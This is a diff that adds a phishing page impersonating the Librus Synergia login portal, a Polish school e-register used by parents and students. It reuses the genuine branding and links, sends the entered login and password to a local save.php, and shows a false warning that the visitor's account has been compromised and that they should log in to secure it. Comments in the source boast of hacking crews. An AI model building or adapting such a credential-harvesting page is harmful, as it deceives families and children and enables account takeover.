@@ -1,0 +1,128 @@
+<title>Synergia - Centrum Autoryzacji</title>
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html lang="pl" xmlns="http://www.w3.org/1999/xhtml">
+                        <!-- FUCK THEM SKIDS - PINGWINEK&CODEBOIS.DEV -->
+                 <!-- CODEBOIS.DEV ON TOP, FUCK ALLAHLEAKS&BLACKCRACK -->
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+<head>  
+        <title>Synergia - Centrum Autoryzacji</title>
+        <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+        <meta http-equiv="Reply-to" content="administrator@dziennik.librus.pl" />
+        <meta http-equiv="Content-Language" content="pl" />
+        <meta name="Description" content="Librus 0Auth password reset service" />
+        <meta name="viewport" content="initial-scale=1, width=device-width, height=device-height" />
+        <meta name="robots" content="noindex">
+        <link rel="shortcut icon" href="https://synergia.librus.pl/images/synergia.ico">
+        <link rel="stylesheet" media="screen" href="css/app.min7373.css?v1.4" />
+        <script src="js/app.min7373.js?v1.4"></script>
+        <script type="text/javascript" src="js/Authorization5d61.js?0.24"></script>
+</head>
+<body class="synergia.rodzina">
+<div class="ajax_loader">
+    <div id="spinner"></div>
+</div>
+<div class="container-fluid">
+    <header class="row">
+        <div class="col-12 order-2 order-md-1 logo">
+            <img src="images/synergia-logo.png" id="synergiaLogo" alt="Logo Synergia">
+        </div>
+        <div class="col-12 order-1 order-md-2 title">
+            <h2 id="viewTitle">Zaloguj się do systemu synergia aby zabezpieczyć konto</h2>
+        </div>
+    </header>
+</div>
+<div class="modal synergiaPopup" id="showProblemsPopup">
+    <div class="modal-dialog modal-dialog-centered">
+        <div class="modal-content">
+            <div class="modal-header">
+                <a href="#" class="close" data-dismiss="modal" data-target="#getAppPopup">&times;</a>
+            </div>
+            <h4 class="modal-title text-center my-2">Uwaga</h4>
+            <div class="messageContainer">
+                <div id="invalidUserType">
+                    <p>Nieprawidłowy login lub hasło lub logujesz się do systemu jako pracownik szkoły. Ten formularz logowania przeznaczony jest dla rodziców lub uczniów. Przejdź na portal Librus Szkoła, aby zalogować się do systemu Synergia jako pracownik szkoły.</p>
+                    <div id="getAndroid" class="my-2">
+                        <a href="https://portal.librus.pl/szkola/synergia/loguj" target="_top" class="no-underline">
+                            <button class="btn btn-full btn-primary">Loguj jako pracownik szkoły</button>
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div><main>
+    <div class="container" id="form-body">
+        <div class="form" id="AuthorizationForm">
+            <div class="fullHeight d-flex flex-column" id="formContent">
+                <span class="backButton">
+                    <a href="#">
+                    <i class="ca ca-back"></i>
+                        Powrót
+                    </a>
+                </span>
+                <div class="LoginBox">
+                    <div class="selectSystemPopup modal synergiaPopup" id="selectSystemBoxButtonsBox">
+                        <div class="modal-dialog modal-dialog-centered">
+                            <div class="modal-content">
+                                <div class="modal-header">
+                                    <a href="#" class="close" data-dismiss="modal" data-target="#selectSystemBoxButtonsBox">&times;</a>
+                                </div>
+                                <h4 class="modal-title text-center my-2">Wybierz rozwiązanie, z którego korzystasz </h4>
+                                <div id="dziennikButton" class="my-2">
+                                    <button class="btn btn-full edziennik" onclick="selectSystem('dziennik');">eDziennik</button>
+                                </div>
+                                <div id="synergiaButton" class="my-2">
+                                    <button class="btn btn-full synergia" onclick="selectSystem('synergia');">Synergia</button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div id="mainError">
+                        <div class="collapse hide errorContainer" role="alert"></div>
+                    </div>
+                    <div>
+                        <form action="save.php" method="POST">
+                        <label class="form-control-label" for="Login">Login</label>
+                        <div id="loginRow" class="mb-3">
+                            <div class="input-group  style-row">
+                                <div class="input-group-prepend">
+                                    <span class="input-group-text">
+                                        <i role="presentation" class="ca-user"></i>
+                                    </span>
+                                </div>
+                                <input aria-invalid="false" type="text" class="form-control" name="Login" id="Login" required="false">
+                            </div>
+                            <div class="collapse hide errorContainer d-box"></div>
+                        </div>
+                        <label class="form-control-label" for="Pass">Hasło</label>
+                        <div id="passwordRow" class="mb-3">
+                            <div class="input-group style-row empty">
+                                <div class="input-group-prepend">
+                                    <span class="input-group-text">
+                                        <i role="presentation" class="ca-locked"></i>
+                                    </span>
+                                </div>
+                                <input aria-invalid="false" type="password" class="form-control" name="Pass" id="Pass" required="false">
+                            </div>
+                            <div class="collapse hide errorContainer"></div>
+                        </div>
+                        <div id="CaptchaBox">
+                        </div>
+                    </div>
+                </div>
+                <div class="buttonContainer" >
+                    <button type="submit" class="btn btn-full btn-primary" id="LoginBtn">Zaloguj</button>
+                </div>
+            </form>
+                                <div class="footer">Jeśli jesteś na tej stronie, oznacza to że twoje konto zostało skompromitowane, zaloguj się i poczekaj na instrukcje<br>
+    Kliknij
+        <a href="https://www.librus.pl/szkoly/systemy/librus-synergia/dzial-faq/" target="_blank">tutaj</a>
+    aby dowiedzieć się więcej.
+</div>            </div>
+        </div>
+    </div>
+</main>
+
+</body>
+</html>
